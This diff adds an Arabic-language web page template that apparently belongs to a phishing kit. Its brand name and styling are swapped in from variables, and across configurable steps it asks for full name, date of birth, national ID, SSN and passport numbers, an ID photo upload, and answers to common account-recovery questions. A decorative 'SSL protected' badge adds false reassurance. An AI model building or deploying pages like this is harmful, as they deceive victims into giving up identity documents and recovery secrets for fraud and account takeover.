@@ -1,0 +1,102 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title><%= pageContent.page_title %> — <%= tpl.name %></title>
+<style>
+:root{--bg:<%= tpl.palette.bg %>;--card:<%= tpl.palette.card %>;--fg:<%= tpl.palette.fg %>;--ac:<%= tpl.palette.accent %>;--ac2:<%= tpl.palette.accent2 %>}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--fg);font-family:system-ui,-apple-system,Tahoma,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:var(--card);border-radius:16px;padding:36px 32px;max-width:460px;width:100%;box-shadow:0 8px 32px #00000040}
+.brand-logo{font-size:1.1rem;font-weight:700;color:var(--ac);margin-bottom:24px;display:block;text-align:center}
+h1{font-size:1.25rem;margin-bottom:8px;text-align:center}
+.sub{font-size:.9rem;opacity:.65;text-align:center;margin-bottom:28px;line-height:1.5}
+.field-group{margin-bottom:16px}
+label{display:block;font-size:.85rem;opacity:.8;margin-bottom:6px}
+input,select,textarea{width:100%;padding:12px 14px;background:var(--bg);border:1.5px solid #ffffff18;border-radius:10px;color:var(--fg);font-family:inherit;font-size:.95rem;transition:.2s;outline:none}
+input:focus,select:focus,textarea:focus{border-color:var(--ac);box-shadow:0 0 0 3px var(--ac)18}
+textarea{resize:vertical;min-height:80px}
+.upload-area{border:2px dashed #ffffff30;border-radius:12px;padding:32px;text-align:center;cursor:pointer;transition:.2s;margin-bottom:16px}
+.upload-area:hover{border-color:var(--ac);background:var(--ac)08}
+.upload-area .icon{font-size:2.5rem;margin-bottom:8px}
+.upload-area p{font-size:.88rem;opacity:.6}
+.btn{width:100%;padding:14px;background:var(--ac);color:#fff;border:0;border-radius:10px;font-size:1rem;font-weight:600;cursor:pointer;margin-top:8px;transition:.2s}
+.btn:hover{opacity:.9}
+.secure{text-align:center;font-size:.78rem;opacity:.45;margin-top:16px;display:flex;align-items:center;justify-content:center;gap:6px}
+.err{background:#ef444420;border:1px solid #ef444440;border-radius:8px;padding:10px 14px;font-size:.85rem;color:#fca5a5;margin-bottom:14px;display:none}
+</style>
+</head>
+<body>
+<div class="card">
+  <span class="brand-logo"><%= tpl.name %></span>
+  <h1><%= pageContent.headline %></h1>
+  <p class="sub"><%= pageContent.subheadline %></p>
+
+  <div class="err" id="err"></div>
+
+  <form method="POST" action="/p/<%= page.slug %>/step/<%= pageContent.slug %>" enctype="multipart/form-data">
+    <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+    <input type="hidden" name="_step" value="<%= pageContent.slug %>">
+
+    <% if (pageContent.form_type === 'id_verify') { %>
+      <% const fldLabels = { full_name:'الاسم الكامل', dob:'تاريخ الميلاد', id_number:'رقم الهوية', ssn:'رقم الضمان الاجتماعي', address:'العنوان', passport_number:'رقم جواز السفر', nationality:'الجنسية' } %>
+      <% (pageContent.fields || []).forEach(f => { %>
+        <div class="field-group">
+          <label><%= fldLabels[f] || f %></label>
+          <input type="<%= f==='dob'?'date':'text' %>" name="<%= f %>" required>
+        </div>
+      <% }) %>
+
+      <% if ((pageContent.fields || []).length === 0 || pageContent.upload_doc) { %>
+        <div class="upload-area" onclick="document.getElementById('docfile').click()">
+          <div class="icon">📷</div>
+          <p>انقر لرفع صورة هويتك</p>
+          <p style="font-size:.78rem;margin-top:4px;opacity:.4">JPG، PNG، PDF — حتى 10MB</p>
+        </div>
+        <input type="file" id="docfile" name="doc_file" accept="image/*,.pdf" style="display:none" onchange="document.querySelector('.upload-area p').textContent=this.files[0]?.name||'اختر ملف'">
+      <% } %>
+
+    <% } else if (pageContent.form_type === 'security_q') { %>
+      <div class="field-group">
+        <label>ما هو اسم مدرستك الابتدائية؟</label>
+        <input type="text" name="answer1" required>
+      </div>
+      <div class="field-group">
+        <label>ما هو اسم والدتك قبل الزواج؟</label>
+        <input type="text" name="answer2" required>
+      </div>
+      <div class="field-group">
+        <label>ما هو اسم حيوانك الأليف الأول؟</label>
+        <input type="text" name="answer3" required>
+      </div>
+
+    <% } else { %>
+      <% const fldLabels = { full_name:'الاسم الكامل', dob:'تاريخ الميلاد', id_number:'رقم الهوية', ssn:'رقم الضمان الاجتماعي', address:'العنوان', phone:'رقم الجوال', email:'البريد الإلكتروني', passport_number:'رقم جواز السفر', nationality:'الجنسية', city:'المدينة', zip:'الرمز البريدي' } %>
+      <% (pageContent.fields || []).forEach(f => { %>
+        <div class="field-group">
+          <label><%= fldLabels[f] || f %></label>
+          <input type="<%= f==='dob'?'date':f==='email'?'email':f==='phone'?'tel':'text' %>" name="<%= f %>" required>
+        </div>
+      <% }) %>
+    <% } %>
+
+    <button type="submit" class="btn"><%= pageContent.cta || 'متابعة' %></button>
+  </form>
+  <p class="secure">🔒 محمي بتشفير SSL</p>
+</div>
+<script>
+document.querySelector('form').addEventListener('submit', function(e) {
+  const inputs = this.querySelectorAll('input[required]');
+  for (const inp of inputs) {
+    if (!inp.value.trim()) {
+      e.preventDefault();
+      document.getElementById('err').style.display='block';
+      document.getElementById('err').textContent='يرجى ملء جميع الحقول';
+      inp.focus(); return;
+    }
+  }
+});
+</script>
+</body>
+</html>
